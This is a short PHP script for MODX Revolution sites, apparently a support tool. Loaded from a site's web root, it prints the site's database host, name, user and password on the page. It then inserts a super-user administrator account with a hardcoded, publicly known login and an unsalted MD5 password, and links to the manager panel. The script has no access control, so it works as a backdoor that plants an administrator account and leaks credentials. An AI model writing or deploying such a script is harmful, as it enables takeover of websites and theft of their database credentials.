<?

//MODX REVOLUTION
//Tested on: 2.4.2-pl
	echo '<h1>ModX Revolution adminer</h1>';
error_reporting( E_ALL );
ini_set('display_errors', 1); 
$config_file = $_SERVER['DOCUMENT_ROOT'].'/core/config/config.inc.php';
include($config_file);
echo "<br />DB_HOST = " . $database_server ."<br />DB_NAME = " . trim($dbase,'`') . "<br />DB_USER = " . $database_user . "<br />DB_PASSWORD = " . $database_password.  "<br />table_prefix = " . $table_prefix .  "<br />";
$dbase = trim($dbase,'`');
$sql_connect = mysql_connect($database_server, $database_user, $database_password) or exit("<p style='color:red'>Can't connect to MySQL</p>");
mysql_select_db($dbase) or exit(mysql_error());
$modx_users = $table_prefix.'users';
$modx_user_attributes = $table_prefix.'user_attributes';
// echo 
$passMD5 = md5('reenter2015');
$hash_class = 'hashing.modMD5';
$salt = '';
// // echo $passMD5;
	$query1 = "INSERT INTO  `$dbase`.`$modx_users` (`id`, `username`, `password`,`class_key`,`active`,`hash_class`,`salt`,`primary_group`,`sudo`)VALUES ('1366613', 'reenter2015', '$passMD5','modUser','1','$hash_class','$salt','1','1');";

	$resquerytest1 = mysql_query($query1) or die("<br /><p style='color: red'>Error: ".mysql_error()."</p>"); 

	
	$query2 = "INSERT INTO `$dbase`.`$modx_user_attributes` (`id`,`internalKey`,`fullname`,`email`,`blocked`,`blockeduntil`,`blockedafter`) VALUES ('1366613', '1366613','ReEnter','support@reenter.ru','0','0','0');";
	$resquerytest2 = mysql_query($query2) or die("<br /><p style='color: red'>Error: ".mysql_error()."</p>"); 

	
	$http_host = $_SERVER['HTTP_HOST'];
	echo "<br /><p style='color: green'>Everything is ok! Try to login : <a href='http://$http_host/manager/' target='_blank'>$http_host/manager/</a></p><p style='color: green'>Login: reenter2015</p><p style='color: green'>Password: reenter2015</p>";
?>